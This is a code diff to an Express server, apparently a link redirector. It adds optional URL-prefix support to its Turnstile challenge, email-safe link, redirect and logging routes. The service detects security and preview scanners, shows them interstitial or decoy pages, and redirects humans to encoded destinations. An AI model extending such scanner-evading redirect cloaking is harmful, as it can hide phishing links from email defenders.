@@ -112,7 +112,9 @@ app.use((req, res, next) => {
   );
   
   // Enhanced CSP with nonce support
-  const isChallengePage = req.path === '/challenge' || req.path === '/challenge-fragment';
+  const isChallengePage =
+    pathMatchesWithOptionalPrefix(req.path, "/challenge", { allowChildren: false }) ||
+    pathMatchesWithOptionalPrefix(req.path, "/challenge-fragment", { allowChildren: false });
   const cspDirectives = [
     "default-src 'self'",
     `script-src 'self' 'nonce-${cspNonce}' https://challenges.cloudflare.com https://challenges.fed.cloudflare.com https://challenges-staging.cloudflare.com ${isChallengePage ? "'unsafe-inline'" : ""}`,
@@ -267,6 +269,34 @@ function parseOptionalUrlPrefix(rawPrefix) {
 const OPTIONAL_URL_PREFIX_SEGMENTS = parseOptionalUrlPrefix(process.env.OPTIONAL_URL_PREFIX || "");
 const OPTIONAL_URL_PREFIX = OPTIONAL_URL_PREFIX_SEGMENTS.join("/");
 
+function getOptionalUrlPrefixPath() {
+  return OPTIONAL_URL_PREFIX ? `/${OPTIONAL_URL_PREFIX}` : "";
+}
+
+function withOptionalUrlPrefix(pathValue) {
+  const normalizedPath = `/${String(pathValue || "").replace(/^\/+/, "")}`;
+  const optionalPrefixPath = getOptionalUrlPrefixPath();
+  if (!optionalPrefixPath) return normalizedPath;
+  return `${optionalPrefixPath}${normalizedPath}`;
+}
+
+function pathMatchesWithOptionalPrefix(pathname, basePath, { allowChildren = true } = {}) {
+  const cleanPath = String(pathname || "");
+  const normalizedBase = `/${String(basePath || "").replace(/^\/+/, "")}`;
+
+  if (cleanPath === normalizedBase) return true;
+  if (allowChildren && cleanPath.startsWith(`${normalizedBase}/`)) return true;
+
+  const optionalPrefixPath = getOptionalUrlPrefixPath();
+  if (!optionalPrefixPath) return false;
+
+  const prefixedBase = `${optionalPrefixPath}${normalizedBase}`;
+  if (cleanPath === prefixedBase) return true;
+  if (allowChildren && cleanPath.startsWith(`${prefixedBase}/`)) return true;
+
+  return false;
+}
+
 function stripOptionalUrlPrefix(pathValue) {
   const clean = safeDecode(String(pathValue || "")).replace(/^\/+|\/+$/g, "");
   if (!clean) {
@@ -287,6 +317,18 @@ function stripOptionalUrlPrefix(pathValue) {
   }
 
   return { payloadPath: clean, usedPrefix: false };
+}
+
+function extractEmailSafePayloadPath(req) {
+  if (req && req.params && typeof req.params.data === "string") {
+    return String(req.params.data);
+  }
+
+  const candidateRaw = String((req?.originalUrl || "").slice(1).split("?")[0] || "");
+  const { payloadPath } = stripOptionalUrlPrefix(candidateRaw);
+  if (!payloadPath) return "";
+  if (payloadPath.startsWith("e/")) return payloadPath.slice(2);
+  return payloadPath;
 }
 
 // ================== REQUEST VALIDATION MIDDLEWARE ==================
@@ -333,7 +375,7 @@ function validateBase64Url(input) {
 function validateRedirectParams(req) {
   const errors = [];
 
-  if (req.path === "/r" || req.path.startsWith("/r/")) {
+  if (pathMatchesWithOptionalPrefix(req.path, "/r")) {
     const baseString = safeDecode(String(req.query.d || req.params.data || ""));
 
     if (!baseString) {
@@ -361,7 +403,7 @@ function validateRedirectParams(req) {
 
   // Catch-all route hardening: reject obvious scanner paths early so they do not
   // enter challenge flow/log spam loops.
-  if (req.path !== "/" && req.path !== "/r" && !req.path.startsWith("/e/")) {
+  if (req.path !== "/" && !pathMatchesWithOptionalPrefix(req.path, "/r") && !req.path.startsWith("/e/")) {
     const candidateRaw = String((req.originalUrl || "").slice(1).split("?")[0] || "");
     const { payloadPath: candidate } = stripOptionalUrlPrefix(candidateRaw);
     if (!candidate || !validateBase64Url(candidate)) {
@@ -383,7 +425,14 @@ function validateRedirectRequest(req, res, next) {
     "/sitemap.xml", "/api/v1/status"
   ];
 
-  if (skipPaths.some(path => req.path.startsWith(path))) {
+  if (
+    skipPaths.some(path => req.path.startsWith(path)) ||
+    pathMatchesWithOptionalPrefix(req.path, "/challenge") ||
+    pathMatchesWithOptionalPrefix(req.path, "/challenge-fragment") ||
+    pathMatchesWithOptionalPrefix(req.path, "/decrypt-challenge-data", { allowChildren: false }) ||
+    pathMatchesWithOptionalPrefix(req.path, "/interstitial-human", { allowChildren: false }) ||
+    pathMatchesWithOptionalPrefix(req.path, "/ts-client-log", { allowChildren: false })
+  ) {
     return next();
   }
 
@@ -419,7 +468,7 @@ function validateRedirectRequest(req, res, next) {
     }
 
     const sendValidationError = () => {
-      if (req.path === "/r" && !req.query.d) {
+      if (pathMatchesWithOptionalPrefix(req.path, "/r", { allowChildren: false }) && !req.query.d) {
         return res.status(400).send("Missing required parameter: d");
       }
       if (errors.some(e => e.includes("Invalid catch-all path"))) {
@@ -428,7 +477,7 @@ function validateRedirectRequest(req, res, next) {
       return res.status(400).send("Invalid request");
     };
 
-    if (req.path === "/r" || req.path.startsWith("/r/")) {
+    if (pathMatchesWithOptionalPrefix(req.path, "/r")) {
       return validationFailureLimiter(req, res, sendValidationError);
     }
 
@@ -1000,7 +1049,7 @@ function createChallengeRedirect(baseString, req, reason, extras = {}) {
   const hostParam = extras.host ? `&host=${encodeURIComponent(extras.host)}` : "";
   const reasonParam = reason ? `&cr=${encodeURIComponent(sanitizeChallengeReason(reason))}` : "";
   addLog(`[CHALLENGE] tokenized redirect ip=${safeLogValue(ip)} reason=${safeLogValue(reason || "auth_required", 40)} len=${baseString.length}`);
-  return `/challenge?ct=${encodeURIComponent(token)}${reasonParam}${hostParam}`;
+  return `${withOptionalUrlPrefix("/challenge")}?ct=${encodeURIComponent(token)}${reasonParam}${hostParam}`;
 }
 
 function isBanned(ip) {
@@ -2708,7 +2757,7 @@ function renderScannerSafePage(req, res, nextEnc, reason = "Pre-scan", options =
 <body style="font:16px system-ui;padding:24px;max-width:720px;margin:auto">
   <h1>Checking this link</h1>
   <p>This link was pre-scanned by security or preview software. If you're the intended recipient, click continue.</p>
-  <p><a id="continue-link" href="/challenge?ct=${encodeURIComponent(challengeToken)}" rel="noopener">Continue</a></p>
+  <p><a id="continue-link" href="${withOptionalUrlPrefix("/challenge")}?ct=${encodeURIComponent(challengeToken)}" rel="noopener">Continue</a></p>
   <p style="color:#6b7280;font-size:14px">Reason: ${mappedReason}</p>
   <script nonce="${nonce}">
     (function(){
@@ -2718,9 +2767,9 @@ function renderScannerSafePage(req, res, nextEnc, reason = "Pre-scan", options =
           var payload = JSON.stringify({ next: cfg.next });
           if (navigator.sendBeacon) {
             var blob = new Blob([payload], { type: "application/json" });
-            navigator.sendBeacon("/interstitial-human", blob);
+            navigator.sendBeacon(${JSON.stringify(withOptionalUrlPrefix("/interstitial-human"))}, blob);
           } else if (window.fetch) {
-            fetch("/interstitial-human", {
+            fetch(${JSON.stringify(withOptionalUrlPrefix("/interstitial-human"))}, {
               method: "POST",
               headers: { "Content-Type": "application/json" },
               body: payload,
@@ -2736,7 +2785,7 @@ function renderScannerSafePage(req, res, nextEnc, reason = "Pre-scan", options =
       setTimeout(function(){
         try {
           if (document.visibilityState && document.visibilityState !== "visible") return;
-          window.location.href = "/challenge?ct=" + encodeURIComponent(cfg.ct);
+          window.location.href = ${JSON.stringify(`${withOptionalUrlPrefix("/challenge")}?ct=`)} + encodeURIComponent(cfg.ct);
         } catch (e) {}
       }, 1200);
     })();
@@ -2755,9 +2804,9 @@ app.use((req, res, next) => {
   if (
     req.path === "/health" ||
     req.path.startsWith("/view-log") ||
-    req.path.startsWith("/challenge") ||
-    req.path.startsWith("/ts-client-log") ||
-    req.path.startsWith("/interstitial-human")
+    pathMatchesWithOptionalPrefix(req.path, "/challenge") ||
+    pathMatchesWithOptionalPrefix(req.path, "/ts-client-log", { allowChildren: false }) ||
+    pathMatchesWithOptionalPrefix(req.path, "/interstitial-human", { allowChildren: false })
   ) {
     return next();
   }
@@ -2766,8 +2815,8 @@ app.use((req, res, next) => {
   if (req.method !== "HEAD" && req.method !== "OPTIONS") return next();
 
   // Handle /e/* specifically (email-safe deep links)
-  if (req.path.startsWith("/e/")) {
-    const clean = (req.originalUrl || "").slice(3).split("?")[0];
+  if (pathMatchesWithOptionalPrefix(req.path, "/e")) {
+    const clean = extractEmailSafePayloadPath(req);
     const scannerCtx = buildScannerInterstitialContext(req, req.method + "-probe");
     if (req.method === "HEAD") {
       logScannerHit(req, scannerCtx.scannerReason || "HEAD-probe", clean);
@@ -2813,15 +2862,15 @@ app.use((req, res, next) => {
   if (
     req.path === "/health" ||
     req.path.startsWith("/view-log") ||
-    req.path.startsWith("/challenge") ||
-    req.path.startsWith("/ts-client-log") ||
-    req.path.startsWith("/interstitial-human")
+    pathMatchesWithOptionalPrefix(req.path, "/challenge") ||
+    pathMatchesWithOptionalPrefix(req.path, "/ts-client-log", { allowChildren: false }) ||
+    pathMatchesWithOptionalPrefix(req.path, "/interstitial-human", { allowChildren: false })
   ) {
     return next();
   }
 
-  if (req.method === "GET" && req.path.startsWith("/e/")) {
-    const clean = (req.originalUrl || "").slice(3).split("?")[0];
+  if (req.method === "GET" && pathMatchesWithOptionalPrefix(req.path, "/e")) {
+    const clean = extractEmailSafePayloadPath(req);
     const scannerCtx = buildScannerInterstitialContext(req, "GET-probe");
     logScannerHit(req, scannerCtx.scannerReason || "GET-probe", clean);
     return renderScannerSafePage(req, res, clean, scannerCtx.scannerReason || "GET-probe", {
@@ -5731,7 +5780,7 @@ function shouldHandleAsDynamicPublicPath(req) {
     '/r'
   ];
 
-  return !reservedPrefixes.some(prefix => pathname === prefix || pathname.startsWith(`${prefix}/`));
+  return !reservedPrefixes.some((prefix) => pathMatchesWithOptionalPrefix(pathname, prefix));
 }
 
 // ================== INITIALIZATION ==================
@@ -5777,6 +5826,11 @@ app.use(validateRedirectRequest);
 app.use("/challenge",          limitChallenge);
 app.use("/ts-client-log",      limitTsClientLog);
 app.use("/interstitial-human", limitTsClientLog);
+if (OPTIONAL_URL_PREFIX) {
+  app.use(withOptionalUrlPrefix("/challenge"), limitChallenge);
+  app.use(withOptionalUrlPrefix("/ts-client-log"), limitTsClientLog);
+  app.use(withOptionalUrlPrefix("/interstitial-human"), limitTsClientLog);
+}
 app.use("/stream-log", (req, res, next) => {
   if (isAdminSSE(req)) return next();
   return limitSseUnauth(req, res, next);
@@ -5806,9 +5860,7 @@ if (process.env.IP_DEBUG === '1') {
 }
 
 // ================== ROUTES ==================
-app.post("/decrypt-challenge-data",
-  express.json({ limit: "1kb" }),
-  (req, res) => {
+const handleDecryptChallengeData = (req, res) => {
     const { data } = req.body || {};
     if (!data) return res.json({ success: false, error: "No data" });
 
@@ -5825,10 +5877,14 @@ app.post("/decrypt-challenge-data",
     }
 
     return res.json({ success: true, payload });
-  }
-);
+  };
 
-app.get("/health", (_req, res) => {
+app.post("/decrypt-challenge-data", express.json({ limit: "1kb" }), handleDecryptChallengeData);
+if (OPTIONAL_URL_PREFIX) {
+  app.post(withOptionalUrlPrefix("/decrypt-challenge-data"), express.json({ limit: "1kb" }), handleDecryptChallengeData);
+}
+
+const handleHealth = (_req, res) => {
   const turnstileHealthy = _health.ok !== false;
   const statusCode = turnstileHealthy ? 200 : 503;
 
@@ -5844,12 +5900,14 @@ app.get("/health", (_req, res) => {
       }
     }
   });
-});
+};
 
-app.post(
-"/ts-client-log",
-  express.text({ type: "*/*", limit: "64kb" }),
-  (req, res) => {
+app.get("/health", handleHealth);
+if (OPTIONAL_URL_PREFIX) {
+  app.get(withOptionalUrlPrefix("/health"), handleHealth);
+}
+
+const handleTsClientLog = (req, res) => {
     const ip  = getClientIp(req) || "unknown";
     const ua  = (req.get("user-agent") || "").slice(0, UA_TRUNCATE_LENGTH);
     const ct  = req.get("content-type") || "-";
@@ -5888,14 +5946,19 @@ app.post(
 
     addLog(`[TS-CLIENT:${safeLogValue(payload.phase)}] ip=${safeLogValue(ip)} ua="${safeLogValue(ua)}" ${safeLogJson(payload)}`);
     addSpacer();
-    res.status(204).end();
-  }
-);
+    return res.status(204).end();
+  };
 
 app.post(
-"/interstitial-human",
-  express.json({ type: "application/json", limit: "4kb" }),
-  (req, res) => {
+"/ts-client-log",
+  express.text({ type: "*/*", limit: "64kb" }),
+  handleTsClientLog
+);
+if (OPTIONAL_URL_PREFIX) {
+  app.post(withOptionalUrlPrefix("/ts-client-log"), express.text({ type: "*/*", limit: "64kb" }), handleTsClientLog);
+}
+
+const handleInterstitialHuman = (req, res) => {
     const body = req.body || {};
     const nextEnc = typeof body.next === "string" ? body.next.slice(0, 4096) : "";
     if (!nextEnc) {
@@ -5911,11 +5974,19 @@ app.post(
     );
     addSpacer();
 
-    res.json({ ok: true });
-  }
-);
+    return res.json({ ok: true });
+  };
 
-app.get("/stream-log", (req, res) => {
+app.post(
+"/interstitial-human",
+  express.json({ type: "application/json", limit: "4kb" }),
+  handleInterstitialHuman
+);
+if (OPTIONAL_URL_PREFIX) {
+  app.post(withOptionalUrlPrefix("/interstitial-human"), express.json({ type: "application/json", limit: "4kb" }), handleInterstitialHuman);
+}
+
+const handleStreamLog = (req, res) => {
   if (!isAdminSSE(req)) return res.status(403).end("Forbidden: missing admin token (SSE)");
 
   res.setHeader("Content-Type", "text/event-stream; charset=utf-8");
@@ -5962,7 +6033,12 @@ app.get("/stream-log", (req, res) => {
 
   req.socket?.setTimeout?.(0);
   req.socket?.setKeepAlive?.(true);
-});
+};
+
+app.get("/stream-log", handleStreamLog);
+if (OPTIONAL_URL_PREFIX) {
+  app.get(withOptionalUrlPrefix("/stream-log"), handleStreamLog);
+}
 
 app.get("/view-log-live", (req, res) => {
   if (!(isAdmin(req) || isAdminSSE(req))) {
@@ -6507,7 +6583,7 @@ function buildChallengeHtml(encryptedData, cspNonce = '') {
     ];
     
     if (criticalPhases.includes(phase)) {
-      fetch('/ts-client-log', {
+      fetch(${JSON.stringify(withOptionalUrlPrefix("/ts-client-log"))}, {
         method: 'POST', 
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify(context)
@@ -6531,7 +6607,7 @@ function buildChallengeHtml(encryptedData, cspNonce = '') {
   });
 
   function decryptChallengeData(encrypted) {
-    return fetch('/decrypt-challenge-data', {
+    return fetch(${JSON.stringify(withOptionalUrlPrefix("/decrypt-challenge-data"))}, {
       method: 'POST',
       headers: {'Content-Type':'application/json'},
       body: JSON.stringify({ data: encrypted })
@@ -6729,7 +6805,7 @@ function buildChallengeHtml(encryptedData, cspNonce = '') {
           const suffix = '&' + sp.toString();
           
           console.log('[TS] Redirecting after successful challenge');
-          window.location.href = '/r?d=' + encodeURIComponent(base) + suffix;
+          window.location.href = ${JSON.stringify(`${withOptionalUrlPrefix("/r")}?d=`)} + encodeURIComponent(base) + suffix;
         } catch(e) {
           console.error('[TS] Navigation error:', e);
           if (statusEl) statusEl.textContent = 'Navigation error. Please retry.';
@@ -6877,7 +6953,7 @@ function buildChallengeHtml(encryptedData, cspNonce = '') {
 </html>`;
 }
 
-app.get("/challenge", limitChallengeView, (req, res) => {
+const handleChallengePage = (req, res) => {
   const resolved = resolveChallengeRequest(req, res);
   if (!resolved) return;
   if (resolved.redirect) return res.redirect(302, resolved.redirect);
@@ -6899,7 +6975,7 @@ app.get("/challenge", limitChallengeView, (req, res) => {
 <body>
 <noscript>Turnstile requires JavaScript. Please enable JS and refresh.</noscript>
 <script nonce="${res.locals.cspNonce || ''}">
-  fetch("/challenge-fragment", {
+  fetch(${JSON.stringify(withOptionalUrlPrefix("/challenge-fragment"))}, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     credentials: "same-origin",
@@ -6913,7 +6989,12 @@ app.get("/challenge", limitChallengeView, (req, res) => {
 </html>`;
 
   res.type("html").send(htmlContent);
-});
+};
+
+app.get("/challenge", limitChallengeView, handleChallengePage);
+if (OPTIONAL_URL_PREFIX) {
+  app.get(withOptionalUrlPrefix("/challenge"), limitChallengeView, handleChallengePage);
+}
 
 function handleChallengeFragment(req, res) {
   const resolved = resolveChallengeRequest(req, res);
@@ -6949,6 +7030,10 @@ function handleChallengeFragment(req, res) {
 
 app.post("/challenge-fragment", limitChallengeView, handleChallengeFragment);
 app.get("/challenge-fragment", limitChallengeView, handleChallengeFragment);
+if (OPTIONAL_URL_PREFIX) {
+  app.post(withOptionalUrlPrefix("/challenge-fragment"), limitChallengeView, handleChallengeFragment);
+  app.get(withOptionalUrlPrefix("/challenge-fragment"), limitChallengeView, handleChallengeFragment);
+}
 
 app.use((req, res, next) => {
   if (!shouldHandleAsDynamicPublicPath(req)) return next();
@@ -6960,9 +7045,8 @@ app.use((req, res, next) => {
   return servePublicPathResponse(req, res, pathname, persona, seed);
 });
 
-app.get("/e/:data(*)", (req, res) => {
-  const urlPathFull = (req.originalUrl || "").slice(3);
-  const clean = urlPathFull.split("?")[0];
+const handleEmailSafePath = (req, res) => {
+  const clean = extractEmailSafePayloadPath(req);
   const scannerCtx = buildScannerInterstitialContext(req, "Email-safe path");
   addLog(`[INTERSTITIAL] /e path used len=${clean.length}`);
   logScannerHit(req, scannerCtx.scannerReason || "Email-safe path", clean);
@@ -6970,11 +7054,15 @@ app.get("/e/:data(*)", (req, res) => {
     emailSafe: true,
     scannerProfile: scannerCtx.scannerProfile
   });
-});
+};
 
-app.head("/e/:data(*)", (req, res) => {
-  const urlPathFull = (req.originalUrl || "").slice(3);
-  const clean = urlPathFull.split("?")[0];
+app.get("/e/:data(*)", handleEmailSafePath);
+if (OPTIONAL_URL_PREFIX) {
+  app.get(withOptionalUrlPrefix("/e/:data(*)"), handleEmailSafePath);
+}
+
+const handleEmailSafePathHead = (req, res) => {
+  const clean = extractEmailSafePayloadPath(req);
   const scannerCtx = buildScannerInterstitialContext(req, "HEAD-probe");
   addLog(`[INTERSTITIAL] HEAD /e path`);
   logScannerHit(req, scannerCtx.scannerReason || "HEAD-probe", clean);
@@ -6983,13 +7071,23 @@ app.head("/e/:data(*)", (req, res) => {
     applyScannerProfileHeaders(res, scannerCtx.scannerProfile);
   }
   res.status(200).type("html").end();
-});
+};
 
-app.get("/r", async (req, res) => {
+app.head("/e/:data(*)", handleEmailSafePathHead);
+if (OPTIONAL_URL_PREFIX) {
+  app.head(withOptionalUrlPrefix("/e/:data(*)"), handleEmailSafePathHead);
+}
+
+const handleRRoute = async (req, res) => {
   const baseString = safeDecode(String(req.query.d || ""));
   if (!baseString) return res.status(400).send("Missing data");
   return handleRedirectCore(req, res, baseString);
-});
+};
+
+app.get("/r", handleRRoute);
+if (OPTIONAL_URL_PREFIX) {
+  app.get(withOptionalUrlPrefix("/r"), handleRRoute);
+}
 
 app.get("/:data(*)", async (req, res) => {
   const urlPathFull = (req.originalUrl || "").slice(1);
